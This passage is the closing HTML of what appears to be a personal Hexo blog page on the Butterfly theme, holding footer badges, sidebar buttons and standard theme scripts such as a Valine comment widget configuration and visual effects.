10:00:00">2021-08-01</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021  <i id="heartbeat" class="fa fas fa-heartbeat"></i> jasson</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text"><p><a style="margin-inline:5px"target="_blank" href="https://hexo.io/"><img src="https://img.shields.io/badge/Frame-Hexo-blue?style=flat&logo=hexo" title="博客框架为 Hexo" alt="HEXO"></a><a style="margin-inline:5px"target="_blank" href="https://butterfly.js.org/"><img src="https://img.shields.io/badge/Theme-Butterfly-6513df?style=flat&logo=bitdefender" title="主题采用 Butterfly" alt="Butterfly"></a><a style="margin-inline:5px"target="_blank" href="https://www.jsdelivr.com/"><img src="https://img.shields.io/badge/CDN-jsDelivr-orange?style=flat&logo=jsDelivr" title="本站使用 Jsdelivr 为静态资源提供CDN加速" alt="Jsdelivr"></a><a style="margin-inline:5px"target="_blank" href="https://github.com/"><img src="https://img.shields.io/badge/Source-Github-d021d6?style=flat&logo=GitHub" title="本站项目由 GitHub 托管" alt="GitHub"></a><a style="margin-inline:5px"target="_blank"href="http://creativecommons.org/licenses/by-nc-sa/4.0/"><img src="https://img.shields.io/badge/Copyright-BY--NC--SA%204.0-d42328?style=flat&logo=Claris" alt="img" title="本站采用知识共享署名-非商业性使用-相同方式共享4.0国际许可协议进行许可"></a></p></div></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/HCLonely/images@master/others/heartbeat.min.css"></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><div class="js-pjax"><script>function loadValine () {
  function initValine () {
    const valine = new Valine(Object.assign({
      el: '#vcomment',
      appId: 'ezr37wKgCkQA0GoJHntOvgbB-MdYXbMMI',
      appKey: '7waFMOWmYb026lMWzexxu7RF',
      placeholder: 'ヾﾉ≧∀≦)o来啊，快活啊!',
      avatar: 'monsterid',
      meta: 'nick,mail,link'.split(','),
      pageSize: '10',
      lang: 'zh-CN',
      recordIP: false,
      serverURLs: '',
      emojiCDN: '',
      emojiMaps: "",
      enableQQ: false,
      path: window.location.pathname,
      requiredFields: ["nick,mail"],
      visitor: false
    }, null))
  }

  if (typeof Valine === 'function') initValine() 
  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
}

if ('Valine' === 'Valine' || !true) {
  if (true) btf.loadComment(document.getElementById('vcomment'),loadValine)
  else setTimeout(loadValine, 0)
} else {
  function loadOtherComment () {
    loadValine()
  }
}</script></div><script defer src="/live2d-widget/autoload.js"></script><script defer src="/js/phone.js"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = false;
POWERMODE.mobile = false;
document.body.addEventListener('input', POWERMODE);
</script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/click-show-text.min.js" data-mobile="true" data-text="富强,明主,文明,和谐,自由,平等,公正,法治,爱国,敬业,诚信,友善" data-fontsize="15px" data-random="false" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>